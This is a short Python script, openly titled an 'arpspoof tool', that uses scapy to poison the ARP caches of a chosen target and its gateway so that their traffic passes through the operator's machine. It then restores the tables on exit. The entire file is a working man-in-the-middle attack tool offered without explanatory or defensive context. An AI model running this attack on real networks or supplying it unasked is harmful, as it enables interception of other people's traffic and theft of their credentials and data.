from scapy.all import *
from scapy.layers.l2 import ARP, Ether, getmacbyip
import time
import rich
from rich.panel import Panel


print("\033[31m+-------------------------+\033[0m")
print("\033[31m|\033[0m \033[34marpspoof tool\033[31m           |\033[0m")
print("\033[31m+-------------------------+\033[0m")

def restore(destination_ip, source_ip):
    destination_mac = getmacbyip(destination_ip)
    source_mac = getmacbyip(source_ip)
    if destination_mac and source_mac:
        packet = Ether(dst=destination_mac) / ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        sendp(packet, count=4, verbose=0)

target_ip = input("enter the target ip:").strip()
getway_ip = input("enter the getway ip:").strip()

mac_target = getmacbyip(target_ip)
mac_getway = getmacbyip(getway_ip)

my_ip = input("enter your ip address:").strip()
mac_my_ip = getmacbyip(my_ip)

packet1 = Ether(dst=mac_target) / ARP(op=2, pdst=target_ip, hwdst=mac_target, psrc=getway_ip, hwsrc=mac_my_ip)
packet2 = Ether(dst=mac_getway) / ARP(op=2, pdst=getway_ip, hwdst=mac_getway, psrc=target_ip, hwsrc=mac_my_ip)

rich.print("[green]press ctrl +c to stop and restore network...")
try:
    while True:
        sendp(packet1, verbose=0)
        sendp(packet2, verbose=0)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Stopping attack and restoring ARP tables...")
    restore(target_ip, getway_ip)
    restore(getway_ip, target_ip)
    print("[+] Network restored successfully.")